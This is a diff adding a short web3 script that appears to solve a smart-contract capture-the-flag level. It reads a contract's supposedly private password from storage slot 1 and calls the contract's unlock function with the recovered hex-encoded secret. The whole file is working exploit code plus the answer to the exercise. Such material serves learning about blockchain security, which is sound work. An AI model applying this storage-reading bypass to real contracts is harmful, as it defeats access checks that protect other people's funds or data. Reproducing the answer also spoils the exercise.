@@ -1,0 +1,49 @@
+use browser CLI
+
+const abi = [
+  {
+    "inputs": [
+      {
+        "internalType": "bytes32",
+        "name": "_password",
+        "type": "bytes32"
+      }
+    ],
+    "stateMutability": "nonpayable",
+    "type": "constructor"
+  },
+  {
+    "inputs": [],
+    "name": "locked",
+    "outputs": [
+      {
+        "internalType": "bool",
+        "name": "",
+        "type": "bool"
+      }
+    ],
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "inputs": [
+      {
+        "internalType": "bytes32",
+        "name": "_password",
+        "type": "bytes32"
+      }
+    ],
+    "name": "unlock",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  }
+]
+const address = '0x558e731e6BF5196F824021592E2e77f373F585dA'
+const contract = new web3.eth.Contract(abi, address)
+const from = '0x87FACa430E7DE6d1DDEb16d2e49D1dF2fA80b838'
+
+// need extract password from storage and use it for unlocking
+await web3.eth.getStorageAt(address, 1)
+
+await contract.methods.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29').send({from: from, gas: 100000})
